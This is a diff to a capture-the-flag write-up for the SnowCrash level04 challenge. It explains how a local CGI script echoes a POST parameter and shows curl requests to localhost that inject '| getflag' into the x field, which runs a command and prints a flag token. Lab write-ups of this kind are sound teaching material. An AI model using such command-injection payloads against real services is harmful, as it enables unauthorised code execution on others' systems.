@@ -29,3 +29,14 @@ Level 04
 	}
 	x(param("x"));
 	```
+	We can in fact see that the content of `y` is printed via the `echo` command !
+*	So I tried something like this using the hint given in comment :
+	```console
+	level04@SnowCrash:~$ curl -X POST -d "x= $PWD" http://localhost:4747
+	/home/user/level04
+	```
+*	This one, I found tricky because we can see echo is executed but what is interesting is that if we use a pipe, ANYTHING is executed :
+	```console
+	level04@SnowCrash:~$ curl -X POST -d "x= | getflag" http://localhost:4747
+	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+	```
